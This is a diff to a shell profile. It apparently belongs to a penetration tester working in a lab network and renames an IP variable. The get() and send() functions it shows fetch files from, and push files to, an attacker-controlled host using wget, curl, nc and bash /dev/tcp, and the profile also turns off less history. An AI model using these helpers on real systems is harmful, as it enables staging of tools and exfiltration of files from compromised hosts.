@@ -18,25 +18,25 @@ _FILE_TRANSFER_PORT=9898
 get() {
   cd /tmp || return
 
-  command -v wget >/dev/null 2>&1              \
-    && wget -c --show-progress "http://$IP/$1" \
+  command -v wget >/dev/null 2>&1                \
+    && wget -c --show-progress "http://$MYIP/$1" \
     && return
 
   command -v curl >/dev/null 2>&1 \
-    && curl -O "http://$IP/$1"    \
+    && curl -O "http://$MYIP/$1"  \
     && return
 
-  command -v nc >/dev/null 2>&1                                                      \
-    && printf "GET /%s HTTP/1.1\n\n" "$1" | nc -nv "$IP" "$_HTTP_SERVER_PORT" > "$1" \
-    && sed -i '1,7d' "$1"                                                            \
+  command -v nc >/dev/null 2>&1                                                        \
+    && printf "GET /%s HTTP/1.1\n\n" "$1" | nc -nv "$MYIP" "$_HTTP_SERVER_PORT" > "$1" \
+    && sed -i '1,7d' "$1"                                                              \
     && return
 
   if [ "$SHELL" = "/bin/bash" ]; then
-    exec 3<>/dev/tcp/"$IP"/"$_HTTP_SERVER_PORT"
+    exec 3<>/dev/tcp/"$MYIP"/"$_HTTP_SERVER_PORT"
 
     while read _request; do
       printf '%s\n\n' "$_request"
-    done <<< "$(printf "GET /%s HTTP/1.1\r\nHost: $IP\r\nConnection: close\r\n" "$1")" >&3
+    done <<< "$(printf "GET /%s HTTP/1.1\r\nHost: $MYIP\r\nConnection: close\r\n" "$1")" >&3
 
     while read _response; do
       printf '%s\n' "$_response"
@@ -46,12 +46,12 @@ get() {
 
 send() {
   # shellcheck disable=SC3025
-  [ "$SHELL" = "/bin/bash" ]                            \
-    && cat "$1" > /dev/tcp/"$IP"/"$_FILE_TRANSFER_PORT" \
+  [ "$SHELL" = "/bin/bash" ]                              \
+    && cat "$1" > /dev/tcp/"$MYIP"/"$_FILE_TRANSFER_PORT" \
     && return
 
-  command -v nc >/dev/null 2>&1                   \
-    && nc -nv "$IP" "$_FILE_TRANSFER_PORT" < "$1" \
+  command -v nc >/dev/null 2>&1                     \
+    && nc -nv "$MYIP" "$_FILE_TRANSFER_PORT" < "$1" \
     && return
 }
 
@@ -135,7 +135,7 @@ __prompt_string_compact_pwd() {
 #---------------------------------------------------------------------------------------------------
 export PATH="${PATH}:/tmp"
 export TERM=screen-256color
-export IP="10.10.14.164"
+export MYIP="10.10.14.84"
 export LESSHISTFILE="/dev/null"
 export LESS="-igRF -j.5 --mouse --wheel-lines=2"
 
